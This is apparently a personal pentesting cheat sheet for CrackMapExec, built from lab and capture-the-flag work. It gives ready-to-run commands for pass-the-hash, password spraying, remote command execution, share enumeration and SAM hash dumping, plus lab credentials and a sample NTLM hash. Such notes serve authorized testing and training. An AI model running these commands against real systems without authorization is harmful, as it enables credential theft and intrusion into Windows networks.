# crackmapexec
- <https://github.com/byt3bl33d3r/CrackMapExec>
- <https://ptestmethod.readthedocs.io/en/latest/cme.html>
- <https://cheatsheet.haax.fr/windows-systems/exploitation/exploitation_tricks/>



This package is a swiss army knife for pentesting Windows/Active Directory environments.



CrackMapExec version 5.4.0 may throw the error The NETBIOS connection with the remote host is timed out for DCSRV1, or doesn't provide any output at all. Version 5.4.1 contains a fix to address this issue.


- perform a brute-force on WinRM in order to identify users and their passwords as well as execute commands on the target system
- enumerating logged on users
- spidering SMB shares
- execute psexec style attacks
- auto-injecting Mimikatz/Shellcode/DLL's into memory using Powershell
- dump the NTDS.dit
- and more











## PtH
```
crackmapexec smb 10.129.41.19 -u rachel -H [NTLM hash]

crackmapexec smb [IP] -u Administrator -H [DUMPED HASH] -x "ipconfig"
```









## Credential Spraying
```
crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success

crackmapexec smb [IP]/24 -u "leon" "Administrator" -p "HomeTaping199\!"

```

If the user with the identified credentials has administrative privileges crackmapexec adds `Pwn3d!` to the output. In an assessment, this is 
an excellent feature to determine the level of access we have without performing additional enumeration.









## SMB

```
crackmapexec [IP]
crackmapexec [IP] --shares -u '' -p ''
crackmapexec [IP] --shares -u 'foobar' -p '' # may fall back to anonymous log in


crackmapexec winrm [IP] -u [USERS FILE] -p [PASSWORD FILE]
crackmapexec winrm [IP] -u administrator -p [PASSWORD FILE]

crackmapexec winrm [IP] -u administrator -p tinkerbell -x "whoami"
crackmapexec winrm [IP] -u administrator -p tinkerbell -x "systeminfo"



# Confirm MachineAccountQuota
crackmapexec ldap 10.10.11.222 -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -M MAQ

```



```
crackmapexec smb [TARGET] -u maya -p "m4y4ngs4ri" --sam
...
MB         10.10.11.14     445    MAILING          localadmin:1001:aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae:::
...
```




list the SMB shares and their permissions
```
crackmapexec smb 192.168.50.242 -u john -p "dqsTwTpZPn#nL" --shares

proxychains -q crackmapexec smb 172.16.6.240-241 172.16.6.254 -u john -d beyond.com -p "dqsTwTpZPn#nL" --shares
```




